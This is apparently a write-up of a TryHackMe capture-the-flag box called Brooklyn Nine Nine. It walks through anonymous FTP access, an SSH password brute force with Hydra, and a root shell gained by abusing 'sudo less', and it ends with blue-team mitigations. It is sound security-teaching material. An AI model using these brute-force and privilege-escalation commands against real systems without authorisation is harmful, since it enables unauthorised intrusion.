# Brooklyn Nine Nine — TryHackMe (Easy)

A beginner box with two intended paths to root. This write-up follows the FTP → SSH route.

> This write-up explains the **method**, not the answers. No flags or passwords are included.

---

## 🎯 Objective

From a single IP, get a foothold, read the user flag, and escalate to root for the root flag. The room hints there are two main ways in; this one goes through anonymous FTP and an SSH brute force.

## 🔍 Recon

```
nmap -sV -oN b99_nmap.txt <IP>
```

Open ports:

| Port | Service | Notes |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 7.6p1 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.29 (Ubuntu) |

Three services to enumerate. The second path exploits port 80; this write-up starts with FTP.

## 🧭 Enumeration — anonymous FTP

FTP sometimes allows the **anonymous** user with no real password:

```
ftp <IP>
# Name: anonymous
# Password: (empty, just Enter)
```

Login succeeds. A single file is listed:

```
ls                      # note_to_jake.txt
get note_to_jake.txt    # download it to Kali
bye
cat note_to_jake.txt
```

The note (from Amy to Jake) reveals two things:

- a valid username: **jake**
- that jake's password is **weak**

That's the whole point of the foothold: a readable file leaking a username and a hint.

## 🔑 Access — SSH brute force with Hydra

A known user + a weak password = brute force the SSH login:

```
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

- `-l jake` — single username (lowercase; `-L` would be a user list).
- `-P rockyou.txt` — password wordlist (`-p` would be a single password).
- `ssh://<IP>` — service and target.

> `rockyou.txt` ships gzipped in Kali — extract it once with `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.

Hydra finds jake's password. Log in:

```
ssh jake@<IP>
```

**User flag** — not in jake's home, but in another user's directory:

```
find / -name user.txt 2>/dev/null   # -> /home/holt/user.txt
cat /home/holt/user.txt
```

A detail in jake's home (`.sudo_as_admin_successful`) hints that jake has used `sudo` — the escalation path.

## 🧗 Privilege escalation — sudo + less

Check what jake can run as root:

```
sudo -l
```

Result:

```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

`less` can be run as root with no password. `less` only "reads" files, but run as root it can read **any** file — including the root flag:

```
sudo less /root/root.txt
```

Or, for a full root shell (the GTFOBins trick), open any file with `sudo less` and type:

```
!/bin/bash
```

`less` spawns the command as root → prompt becomes `#`. Confirm with `id` (`uid=0(root)`).

## 📚 What I learned

- Full chain: recon → FTP enumeration → SSH brute force → user flag → sudo abuse → root.
- Anonymous FTP can leak files; a leaked note gave both the username and the "weak password" hint.
- Hydra brute-forces logins the same way Gobuster brute-forces directories — different wordlist (`rockyou.txt` for passwords, `common.txt` for dirs).
- `ssh user@host`: on Linux the username is part of the command (unlike Cisco, where you log in after connecting).
- Two escalation routes now in the toolkit: **sudo** (`sudo -l`) and **SUID** (`find / -perm -4000`).
- `sudo less` is a textbook misconfig: a file reader running as root reads anything, and can even spawn a root shell via `!`.
- Flags (`user.txt`, `root.txt`) are lab trophies — they don't exist on a real system.

## 🛡️ Mitigation (blue team view)

- Disable anonymous FTP, or keep only non-sensitive files in it; never leave notes with usernames/hints.
- Enforce strong passwords and rate-limit / lock out SSH brute force (fail2ban, key-only auth).
- Grant `sudo` narrowly: never give a user NOPASSWD on a binary that can read arbitrary files or spawn a shell (`less`, `vi`, `find`, `nmap`…).
- Apply least privilege and keep services patched.
